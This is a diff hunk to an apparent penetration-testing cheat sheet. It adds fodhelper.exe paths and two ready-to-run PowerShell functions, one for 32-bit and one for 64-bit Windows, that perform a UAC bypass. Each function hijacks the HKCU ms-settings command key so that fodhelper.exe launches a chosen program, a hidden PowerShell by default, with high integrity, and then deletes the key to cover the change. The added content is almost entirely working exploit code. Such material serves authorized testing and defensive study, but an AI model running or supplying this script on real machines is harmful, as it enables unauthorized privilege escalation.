@@ -355,8 +355,60 @@ command of our choosing with high integrity
 whoami /groups #check your integrity level
 ````
 ````
-C:\Windows\System32\fodhelper.exe
+C:\Windows\System32\fodhelper.exe #32 bit
+C:\Windows\SysNative\fodhelper.exe #64 bit
 ````
+Script to automate these steps #32bit
+````
+function FodhelperBypass(){ 
+ 
+Param (    
+ 
+ [String]$program = "cmd /c start powershell.exe" #default
+ 
+      )
+ 
+#Create registry structure
+ 
+New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
+New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
+Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force
+ 
+#Perform the bypass
+Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
+ 
+#Remove registry structure
+Start-Sleep 3
+Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
+ 
+}
+````
+Script to automate these steps #64bit
+````
+function FodhelperBypass(){ 
+ 
+Param (    
+ 
+ [String]$program = "cmd /c start powershell.exe" #default
+ 
+      )
+ 
+#Create registry structure
+ 
+New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
+New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
+Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force
+ 
+#Perform the bypass
+Start-Process "C:\Windows\SysNative\fodhelper.exe" -WindowStyle Hidden
+ 
+#Remove registry structure
+Start-Sleep 3
+Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
+ 
+}
+````
+
 ## Active Directory <img src="https://www.outsystems.com/Forge_CW/_image.aspx/Q8LvY--6WakOw9afDCuuGXsjTvpZCo5fbFxdpi8oIBI=/active-directory-core-simplified-2023-01-04%2000-00-00-2023-02-07%2007-43-45" width="40" height="40" />
 
 ### Active Directory Enumeration <img src="https://cdn-icons-png.flaticon.com/512/9616/9616012.png" width="40" height="40" />
